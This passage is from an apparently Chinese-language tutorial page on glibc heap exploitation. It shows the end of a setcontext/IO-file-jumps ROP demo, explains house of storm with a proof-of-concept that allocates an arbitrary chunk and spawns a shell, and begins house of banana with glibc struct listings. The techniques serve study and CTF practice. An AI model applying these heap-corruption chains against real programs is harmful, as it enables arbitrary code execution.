class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">8</span>, sfi&#125;;</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setROP</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    sandbox();</span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x81630</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x53030</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="type">size_t</span> IO_helper = libc_base + <span class="number">0x1E48C0</span>; <span class="comment">// _IO_helper_jumps;</span></span><br><span class="line">    <span class="type">size_t</span> SYNC = libc_base + <span class="number">0x1E5520</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    setROP();</span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA0</span>/<span class="number">8</span>) = ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)SYNC) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h1><h2 id="概要-10"><a href="#概要-10" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>House_of_storm</code>是一种结合了<code>unsorted_bin_attack</code>和<code>Largebin_attack</code>的攻击技术,其基本原理和<code>Largebin_attack</code>类似，但是不同的是<code>Largebin_attack</code>只可以在任意地址写出chunk地址实际应用中除了泄漏一个堆地址并没有什么其他用处，所以其基本无害。而<code>House_of_storm</code>则可以导致任意地址分配chunk，也就是可以造成任意地址写的后果，危害十分之大。<code>House_of_storm</code>虽然危害之大，但是其条件也是非常的苛刻。</p><p><strong>利用条件:</strong></p><ol><li>需要攻击者在<code>largebin</code>和<code>unsorted_bin</code>中分别布置一个chunk 这两个chunk需要在归位之后处于同一个<code>largebin</code>的index中,且<code>unsortedbin</code>中的chunk要比<code>largebin</code>中的大</li><li>需要<code>unsorted_bin</code>中的<code>bk指针</code>可控</li><li>需要<code>largebin</code>中的<code>bk指针和bk_nextsize</code>指针可控</li><li>更适用于有pie情况</li></ol><p><strong>利用效果:</strong>任意地址分配chunk</p><p><strong>有效版本:</strong>2.29</p><p><strong>失效原因:</strong>2.29unsorted_attck不再可行,2.30large_attack又被砍掉一半,且正好是该方式需要用的的部分</p><h2 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h2><hr><p> <code>House_of_storm</code>从根本上也是写堆地址，但是攻击者可以利用巧妙的构造<code>把这个堆地址伪造成size字段</code>。</p><p><strong>通过以前的知识可以知道<code>unsorted_bin_attack</code>的攻击是需要在对应地址伪造一个chunk结构出来的，而这个伪造出来的chunk结构最重要的就是这个<code>size字段</code>，因为只有首先有了<code>size字段</code>Glibc才会确认这是个chunk结构,才会有后续的验证。</strong></p><p>说简单就是要绕过unsorted遍历时的size检查</p><p>但是目前的情况因为我们不能去对应的地址伪造chunk，那么首要目标就是利用<code>Largebin_attack</code>在目标地址-8的位置上写出来一个<code>size</code>，其次就是对Glibc检验的绕过。</p><h2 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  presize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd_nextsize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk_nextsize;</span><br><span class="line">&#125;chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk = (<span class="type">unsigned</span> <span class="type">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//重点以下3步</span></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="type">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在开启pie的情况下,堆块的高位一般都是0x55或0x56,共6字节,从size-5开始写就可以刚好把高位写在size</p><p>所以当我们申请的size和<code>0x56</code>经过对齐后相等的话，那么就可以拿到任意的chunk。</p><p>0x55 : <code>1010101</code></p><p>0x56 : <code>1010110</code></p><p><code>__int_malloc</code>在拿到chunk后返回到<code>__libc_malloc</code>，<code>__libc_malloc</code>会对chunk的进行检查，这里如果有错的话会直接crash，但是由于程序有随机化，多运行几次总能有一次成功的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">    (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    过以下检测需要满足的要求，只需满足一条即可</span></span><br><span class="line"><span class="comment">    1. victim 为 0</span></span><br><span class="line"><span class="comment">    2. IS_MMAPPED 为 1</span></span><br><span class="line"><span class="comment">    3. NON_MAIN_ARENA 为 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) </span><br><span class="line">       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></table></figure><p>可以看出只有高位为0x56的情况下能通过检测</p><h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h2 id="概要-11"><a href="#概要-11" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>利用largebin attack劫持_rtld_global中的字段,间接或直接控制fini_array,以便在函数正常退出或返回时调用布置的函数</p><p><strong>利用条件:</strong></p><ol><li><strong>程序能够显式的执行exit函数</strong>或者<strong>是通过libc_start_main启动的主函数且主函数能够结束</strong>,二者需满足其一</li><li>largebin attack (可写free状态下largebin的bk_nextsize字段)</li></ol><p><strong>适用情况:</strong>存在largebin attack,Tcache Stashing Unlink Attack等</p><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h2><p>在ld.so里存在一个_rtld_global结构体</p><p>gpt对这个结构的解释</p><blockquote><p>在Linux中，ELF（可执行与可链接格式）是一种用于执行程序和共享库的标准文件格式。而_rtld_global结构体是在Linux系统中用于管理动态链接器（runtime linker）的全局数据结构。</p><p>动态链接器（runtime linker）是负责在程序运行时加载和链接共享库的组件。它的主要任务是解析程序的依赖关系，加载所需的共享库，并解析符号引用，以便将其绑定到正确的地址上。</p><p>_rtld_global结构体是动态链接器的关键数据结构之一，它存储了动态链接器在运行时所需的全局信息。该结构体定义了动态链接器的状态和属性，包括已加载的共享库列表、符号表、重定位表、全局变量等等。</p><p>通过_rtld_global结构体，动态链接器可以跟踪和管理程序的符号依赖关系、共享库的加载和卸载、符号解析和重定位等操作。它提供了一个全局的上下文，使得动态链接器能够正确地处理程序的运行时链接需求。</p><p>总而言之，_rtld_global结构体在Linux中的作用是为动态链接器提供全局的状态和信息，以支持程序的动态加载和链接过程。</p></blockquote><p>该结构体较为复杂</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rtld_global</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="keyword">struct</span> <span class="title class_">link_namespaces</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *_ns_loaded;</span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">r_scope_elem</span> *_ns_main_searchlist;</span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *libc_map;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">unique_sym_table</span></span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">unique_sym</span></span><br><span class="line">      &#123;</span><br><span class="line">    <span class="type">uint32_t</span> hashval;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="type">size_t</span> size;</span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="built_in">void</span> (*free) (<span class="type">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">r_debug</span> _ns_debug;</span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中有多个<code>_dl_ns</code>结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体</p><p>类似于IDA中的段结构体</p><p>继续之后的学习还会遇见以下几个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Phdr)</span> *l_phdr;<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="type">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">lt_executable,<span class="comment">/* The main executable program.  */</span></span><br><span class="line">lt_library,<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">lt_loaded<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_relocated:<span class="number">1</span>;<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    ............以下还有不少,在这里不是很重要</span><br><span class="line">   <span class="comment">//在 C 语言中，变量声明后加:1 表示该变量是一个位域（bit-field）。位域允许将一个整数类型的数据分割为多个较小的位字段，以便更有效地使用内存。&quot;:1&quot; 表示该位域的宽度为 1 位。这意味着该变量只能存储一个位的值，即 0 或 1。</span></span><br><span class="line">        <span class="comment">//l_init_called变量在这里是第四个位域</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ptype Elf64_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf64_Sxword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf64_Xword d_val;<span class="comment">//union结构体只取其一</span></span><br><span class="line">        Elf64_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这些个结构体在退出时会被dl_fini调用[glibc/elf/dl_fini.c]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 